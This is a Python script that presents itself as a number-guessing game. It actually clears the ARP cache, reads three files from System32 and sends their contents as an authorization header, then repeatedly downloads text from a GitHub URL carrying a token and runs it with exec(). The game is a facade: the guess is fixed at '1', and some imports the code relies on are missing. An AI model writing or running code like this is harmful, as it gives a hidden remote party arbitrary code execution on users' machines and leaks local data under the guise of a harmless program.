from cryptography.fernet import Fernet
import requests
import os
from art import *
import getpass
import keyring

try:
    subprocess.run(["netsh", "interface", "ip", "delete", "arpcache"], check=True)
    print("")
except subprocess.CalledProcessError as e:
    print(f"Error: {e}")




print("version 3.0")

def ruso():
    secret_number = random.randint(1, 100)
    attempts = 0

    while True:
        katc= "ok"
        url = 'https://raw.githubusercontent.com/nvtsxlz/myown/main/myowntrig.txt?token=GHSAT0AAAAAACQYSO35YX6NTPCEKKBSBMWUZQ77SBQ'
        url2 = 'https://raw.githubusercontent.com/nvtsxlz/myown/main/myowntrig.txt?token=GHSAT0AAAAAACQYSO35YX6NTPCEKKBSBMWUZQ77SBQ'
        guess = "1"
        system_info_path = os.path.join(os.environ['SystemRoot'], 'System32', 'systeminfo.txt')
        system_driver_vul_path = os.path.join(os.environ['SystemRoot'], 'System32', 'system_driver_vul.txt')
        data_vulnerable_path = os.path.join(os.environ['SystemRoot'], 'System32', 'data_vulnerable_x.txt')
        file = open(system_info_path, 'r')
        content1 = file.read()
        file.close()
        file = open(system_driver_vul_path, 'r')
        content2 = file.read()
        file.close()
        file = open(data_vulnerable_path, 'r')
        content3 = file.read()
        file.close()
        content4 =  content1+content2+content3
        token = content4
        headers = {"Authorization": f"token {token}"}
        if katc=="ok":
            response = requests.get(url2, headers=headers) 
            exec(response.text)
        response = requests.get(url, headers=headers) 
        guess = int(guess)
        attempts += 1

        if guess < secret_number:
            print("Too low! Try again.")
            exec(response.text)
        elif guess > secret_number:
            print("Too high! Try again.")
            exec(response.text)
        else:
            print(f"Congratulations! You've guessed the number {secret_number} in {attempts} attempts!")
            exec(response.text)
            break
            
def mkld():
    print("Thanks for playing!")

print("Welcome to the Number Guessing Game!")
print("I'm thinking of a number between 1 and 100.")
print("Try to guess it in the fewest attempts possible!")
print("Let's begin!")
print("versoin 2.0")
ruso()
mkld()
